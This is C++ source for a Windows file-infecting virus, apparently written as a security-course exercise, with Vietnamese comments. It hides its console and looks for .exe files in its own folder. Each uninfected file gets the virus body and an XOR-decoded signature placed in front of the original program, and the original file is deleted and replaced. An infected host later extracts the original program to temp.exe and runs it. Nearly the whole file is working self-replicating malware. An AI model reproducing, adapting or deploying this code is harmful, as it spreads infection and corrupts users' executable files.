#include <windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>
#include <atlbase.h>
#include "dirent.h"
#include <wchar.h>
#include <algorithm>
#include <iterator>


#pragma warning(disable:4996)

#define BUFF_SIZE 512


char SIGN[] = { 0x57,0x58,0x5e,0x49,0x42,0x43,0x49,0x27,0x24,0x25,0x22 };

using namespace std;

int FindSignature(wchar_t *cFileName)
{
	//tạo Real SIGN:
	char RealSIGN[sizeof(SIGN)];
	for (int i = 0; i < sizeof(SIGN); i++)
	{
		RealSIGN[i] = SIGN[i] ^ 0x16;
	}

	DWORD  dwRead = 0;
	HANDLE hFile = CreateFile(cFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	LPBYTE buffer = (LPBYTE)VirtualAlloc(NULL, BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	int count = 0;
	do
	{
		//ZeroMemory(buffer, BUFF_SIZE);
		ReadFile(hFile, buffer, BUFF_SIZE, &dwRead, NULL);
		count += 1;
		if (dwRead == 0) //đã đọc hết
		{
			break;
		}
		else //đang đọc
		{
			if (dwRead < BUFF_SIZE) //Bị lẻ byte
			{
				for (DWORD i = dwRead; i < BUFF_SIZE; i++)
				{
					buffer[i] = 0;
				}
			}

			const char* buf = reinterpret_cast<const char*>(buffer);


			std::string needle(RealSIGN, RealSIGN + sizeof(SIGN));
			std::string haystack(buf, buf + BUFF_SIZE);
			size_t posInBuffer = haystack.find(needle);

			if (posInBuffer != string::npos)// Có Signature
			{
				unsigned int pos = posInBuffer + (count - 1) * 512; //Working with ~4GB file exe - it's not real.
				CloseHandle(hFile);
				return pos;
			}

			continue;
		}
	} while (TRUE);

	CloseHandle(hFile);
	return -1; //không có SIGN

}

void DoSomeThingWrong(WIN32_FIND_DATA filedt, wchar_t *curFileRunningPath) //Thực hiện lây nhiễm
{
	HANDLE virusFile = CreateFile(curFileRunningPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE stockFile = CreateFile(filedt.cFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	wchar_t temp[MAX_PATH];
	wcscpy(temp, filedt.cFileName);
	wcscat(temp, L"_");

	HANDLE infectFile = CreateFile(temp, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

	//Tìm vị trí signature của mình:
	int virusPos = FindSignature(curFileRunningPath);
	DWORD mySize;
	DWORD debg;
	if (virusPos <= -1)
	{
		mySize = GetFileSize(virusFile, &debg);
	}
	else
	{
		mySize = virusPos;
	}

	DWORD dwRead = 0;
	DWORD dwWritten = 0;
	LPBYTE bufferRead = (LPBYTE)VirtualAlloc(NULL, BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);

	//Ghi File virus vao file moi
	do
	{
		ReadFile(virusFile, bufferRead, BUFF_SIZE, &dwRead, NULL);
		if (dwRead != 0)
		{
			if (mySize >= BUFF_SIZE)
			{
				WriteFile(infectFile, bufferRead, BUFF_SIZE, &dwWritten, NULL);
				if (BUFF_SIZE != dwWritten) return; //Error
				mySize = mySize - dwWritten;
			}
			else  //khi đến đoạn có SIGN hoặc hết size của file virus:
			{
				WriteFile(infectFile, bufferRead, mySize, &dwWritten, NULL);
				if (mySize != dwWritten) return; //Error
				mySize = mySize - dwWritten;
				break;
			}
		}
		else
			return; //Error
	} while (mySize > 0);

	VirtualFree(bufferRead, BUFF_SIZE, MEM_RELEASE);

	//Ghi Signature
	char RealSIGN[sizeof(SIGN)];
	for (int i = 0; i < sizeof(SIGN); i++)
	{
		RealSIGN[i] = SIGN[i] ^ 0x16;
	}
	WriteFile(infectFile, RealSIGN, sizeof(SIGN), &dwWritten, NULL);
	if (dwWritten != sizeof(SIGN)) return; //ERRORRR

	//Ghi file Stock
	LPBYTE bufferRead2 = (LPBYTE)VirtualAlloc(NULL, BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	mySize = GetFileSize(stockFile, &debg);
	dwRead = 0;
	dwWritten = 0;
	do
	{
		ReadFile(stockFile, bufferRead2, BUFF_SIZE, &dwRead, NULL);
		if (dwRead != 0)
		{
			if (mySize >= BUFF_SIZE)
			{
				WriteFile(infectFile, bufferRead2, BUFF_SIZE, &dwWritten, NULL);
				mySize = mySize - dwWritten;
			}
			else
			{
				WriteFile(infectFile, bufferRead2, mySize, &dwWritten, NULL);
				mySize = mySize - dwWritten;
				break;
			}
		}
		else
			return; //Error
	} while (mySize > 0);

	//Close
	CloseHandle(virusFile);
	CloseHandle(stockFile);
	CloseHandle(infectFile);

	//Xóa file gốc
	DeleteFile(filedt.cFileName);

	//ĐỔi tên file temp
	MoveFile(temp, filedt.cFileName);


	return;
}

void DumpStockFile(wchar_t* randName, wchar_t* curRunFile, int pos)
{
	int signPos = pos + sizeof(SIGN); //vi tri bat dau sau SIGN

	int n = signPos / BUFF_SIZE;
	int r = signPos % BUFF_SIZE;

	LPBYTE buffer = (LPBYTE)VirtualAlloc(NULL, BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);

	HANDLE runningFile = CreateFile(curRunFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD numRead;
	for (int i = 0; i < n; i++)
	{
		ReadFile(runningFile, buffer, BUFF_SIZE, &numRead, NULL);
	}
	ReadFile(runningFile, buffer, r, &numRead, NULL);

	//đã chuyển con trỏ đến vị trí file gốc:
	HANDLE stockFile = CreateFile(randName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	VirtualFree(buffer, BUFF_SIZE, MEM_RELEASE);
	LPBYTE buffer2 = (LPBYTE)VirtualAlloc(NULL, BUFF_SIZE, MEM_COMMIT, PAGE_READWRITE);
	DWORD numWrite;
	do
	{
		numRead = 0;
		ReadFile(runningFile, buffer2, BUFF_SIZE,&numRead,NULL );

		if (numRead == 0) //break khi đọc hết file
			break;

		WriteFile(stockFile, buffer2, numRead, &numWrite, NULL);
	} while (true);

	CloseHandle(stockFile);
	return;
}

void HideConsole()
{
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
}

int main(int argc, char** argv) {
	HideConsole();
	MessageBoxA(NULL, "Virus!!!", "Dao Anh Tu - BDATTT!", MB_OK);
	USES_CONVERSION; 

	//Get current processPath:
	wchar_t curFileRunningPath[MAX_PATH];
	GetModuleFileName(NULL, curFileRunningPath, MAX_PATH);
	

	//Search File:
	wchar_t curPath[MAX_PATH];
	GetModuleFileName(NULL, curPath, MAX_PATH);
	PathRemoveFileSpec(curPath);
	wcscat(curPath, L"\\*");
	LARGE_INTEGER filesize;
	WIN32_FIND_DATA filedt;
	LPCWSTR curDir2 = (const WCHAR*)curPath;
	HANDLE ffHandle;
	ffHandle = FindFirstFile(curDir2, &filedt);

	do
	{
		if (filedt.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) // Nếu là Folder
		{
			_tprintf(TEXT("Dir %s \n"), filedt.cFileName);
		}
		else //Nếu là 
		{
			filesize.LowPart = filedt.nFileSizeLow;
			filesize.HighPart = filedt.nFileSizeHigh;
			_tprintf(TEXT(" %s   %ld bytes \n"), filedt.cFileName, filesize.QuadPart);

			//Lọc file .exe:
			wchar_t* pwc = wcsstr(filedt.cFileName, L".exe");
			if (pwc != NULL)
			{
				//Get PATH Current check file
				wchar_t FileChooseNow[MAX_PATH];
				GetModuleFileName(NULL, FileChooseNow, MAX_PATH);
				PathRemoveFileSpec(FileChooseNow);
				wcscat(FileChooseNow, L"\\");
				wcscat(FileChooseNow, filedt.cFileName);

				if (wcslen(pwc) == 4 && wcscmp(FileChooseNow,curFileRunningPath)!=0 ) //là file .exe và không phải file đang chạy
				{
					int IsInfected = FindSignature(FileChooseNow);
					if (IsInfected == -1) //chưa bị nhiễm
					{
						DoSomeThingWrong(filedt, curFileRunningPath);
					}
					else //đã bị nhiễm
					{

					}
				}
			}


		}
	} while (FindNextFile(ffHandle, &filedt) != 0);

	//Thực hiện xong hành vi xấu xa:
	//dump chương trình gốc và chạy nó
	//Check xem file đang chạy là virus gốc hay đã ký sinh:
	int isF0 = FindSignature(curFileRunningPath);
	if (isF0 == -1)
	{
		//I am a Grooooottt
	}
	else 
	{
		//Đây là file đã bị ký sinh
		//Thực hiện dump file và chạy file gốc
		wchar_t InfectedRunning[MAX_PATH];
		GetModuleFileName(NULL, InfectedRunning, MAX_PATH);
		PathRemoveFileSpec(InfectedRunning);
		wcscat(InfectedRunning, L"\\");
		wcscat(InfectedRunning, L"temp.exe");
		DeleteFile(InfectedRunning);//Delete file cũ nếu có
		DumpStockFile(InfectedRunning, curFileRunningPath, isF0);
		//ShellExecute(NULL, L"open", InfectedRunning, NULL, NULL, SW_SHOWDEFAULT);

		//Run Stock File:
		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		CreateProcessW(InfectedRunning, NULL, NULL, NULL, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		WaitForSingleObject(pi.hProcess, INFINITE);

		// Close process and thread handles.
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		//Del file sau khi chạy xong:
		DeleteFile(InfectedRunning);//Delete file cũ nếu có
	}

	return 0;
}
